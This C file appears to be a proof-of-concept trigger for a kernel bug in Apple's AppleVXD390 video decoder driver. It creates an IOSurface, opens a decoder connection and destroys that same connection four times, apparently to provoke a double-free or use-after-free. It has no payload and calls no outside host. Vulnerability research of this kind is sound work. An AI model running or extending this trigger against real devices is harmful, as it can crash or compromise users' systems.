#include <stdio.h>
#include <IOKit/IOKitLib.h>
#include <stdlib.h>
#include <string.h>

#include "iosurface.h"
#include "applevxd390.h"

int main(int argc, char* argv[]) {
	uint32_t surface_id = createSurface();

	if (!surface_id) {
		printf("Could not create surface\n");
		return 1;
	}

	printf("surface ID: %x\n", surface_id);

	io_connect_t conn = createDecoder(surface_id);
	if (!conn) {
		printf("Could not create decoder\n");
		return 1;
	}

	if (!destroyDecoder(conn)) {
		printf("Could not destroy decoder\n");
		return 1;
	}
	if (!destroyDecoder(conn)) {
		printf("Could not destroy decoder\n");
		return 1;
	}
	if (!destroyDecoder(conn)) {
		printf("Could not destroy decoder\n");
		return 1;
	}
	if (!destroyDecoder(conn)) {
		printf("Could not destroy decoder\n");
		return 1;
	}

	return 0;
}
